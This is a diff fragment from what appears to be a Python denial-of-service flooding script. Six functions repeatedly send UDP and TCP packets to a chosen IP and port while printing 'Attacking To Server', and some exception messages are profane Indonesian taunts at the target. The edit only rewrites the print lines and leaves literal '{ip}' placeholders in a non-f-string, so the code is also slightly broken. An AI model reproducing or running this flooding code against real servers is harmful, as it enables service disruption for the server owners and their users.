@@ -57,7 +57,7 @@ def xxxxxx():
       addr = (str(ip),int(port))
       for x in range(times):
         s.sendto(data,addr)
-        print(i +" \033[32m=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port)) 
+        print(i +" \033[32m=====> Attacking To Server {ip} and {port} \033[0m%s:%s!!!"%(ip,port)) 
     except:
       print("\033[33m [!]\033[32m PODI\033[36m MELUNCURKAN \033[31mPACKET")
 
@@ -70,7 +70,7 @@ def xxxxx():
       addr = (str(ip),int(port))
       for x in range(times):
         s.sendto(data,addr)
-        print(i +" \033[32m=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port)) 
+        print(i +" \033[32m=====> Attacking To Server {ip} and {port} \033[0m%s:%s!!!"%(ip,port)) 
     except:
            print("\033[33m [!]\033[32m PODI\033[36m MELUNCURKAN \033[31mPACKET")
 
@@ -83,7 +83,7 @@ def xxxx():
       addr = (str(ip),int(port))
       for x in range(times):
         s.sendto(data,addr)
-        print(i +" \033[32m=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port)) 
+        print(i +" \033[32m=====> Attacking To Server {ip} and {port} \033[0m%s:%s!!!"%(ip,port)) 
     except:
            print("\033[33m [!]\033[32m PODI\033[36m MELUNCURKAN \033[31mPACKET")
 
@@ -97,7 +97,7 @@ def xxx():
       s.send(data)
       for x in range(times):
         s.send(data)
-        print(i +" \033[32m=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port)) 
+        print(i +" \033[32m=====> Attacking To Server {ip} and {port} \033[0m%s:%s!!!"%(ip,port)) 
     except:
       s.close()
       print("[!] MATI LU SERVER NGENTOD")
@@ -112,7 +112,7 @@ def xx():
       s.send(data)
       for x in range(times):
         s.send(data)
-        print(i +" \033[32m=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port)) 
+        print(i +" \033[32m=====> Attacking To Server {ip} and {port} \033[0m%s:%s!!!"%(ip,port)) 
     except:
       s.close()
       print("[!] SERVER LEMAH JANCOKK")
@@ -127,7 +127,7 @@ def x():
       s.send(data)
       for x in range(times):
         s.send(data)
-        print(i +" \033[32m=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port)) 
+        print(i +" \033[32m=====> Attacking To Server {ip} and {port} \033[0m%s:%s!!!"%(ip,port)) 
     except:
       s.close()
       print("[!] SERVER MU LEMAH SEKALI")
